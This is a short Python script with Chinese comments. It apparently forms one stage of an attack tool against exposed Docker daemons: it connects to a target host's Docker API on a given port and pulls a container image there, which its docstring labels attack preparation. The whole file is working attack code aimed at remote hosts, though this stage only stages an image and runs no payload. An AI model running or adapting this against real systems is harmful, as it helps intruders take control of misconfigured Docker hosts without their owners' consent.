#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
run_pratt.py - Docker镜像下载功能
"""

import subprocess


def run_pratt(target, port, image_name="alpine", timeout=10):
    """执行攻击准备 - 下载指定镜像

    Args:
        target: 目标地址
        port: 端口号
        image_name: 镜像名称
        timeout: 超时时间

    Returns:
        bool: 成功返回True，失败返回False
    """
    try:
        # 构建 Docker 主机地址
        docker_host = f"{target}:{port}"

        print(f"[+] 目标: {docker_host}")
        print(f"[+] 镜像: {image_name}")

        # 先检查镜像是否已存在
        images_cmd = ["docker", "-H", docker_host, "images", "-q", image_name]
        images_result = subprocess.run(images_cmd, capture_output=True, text=True)
        if images_result.stdout.strip():
            print(f"[-] 镜像 {image_name} 已存在")
            return True

        # 下载镜像
        print(f"[+] 开始下载...")
        pull_cmd = ["docker", "-H", docker_host, "pull", image_name]
        pull_process = subprocess.Popen(pull_cmd,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.STDOUT,
                                        text=True)

        # 实时输出下载进度
        print("[+] 进度:")
        while True:
            output = pull_process.stdout.readline()
            if not output and pull_process.poll() is not None:
                break
            if output:
                print(f"    {output.strip()}")

        # 获取最终结果
        pull_process.wait(timeout=timeout)

        if pull_process.returncode == 0:
            print(f"[√] 镜像下载成功")
            return True
        else:
            print(f"[-] 镜像下载失败")
            return False

    except subprocess.TimeoutExpired:
        print(f"[-] 下载镜像超时")
        return False
    except Exception as e:
        print(f"[-] 执行出错: {str(e)}")
        return False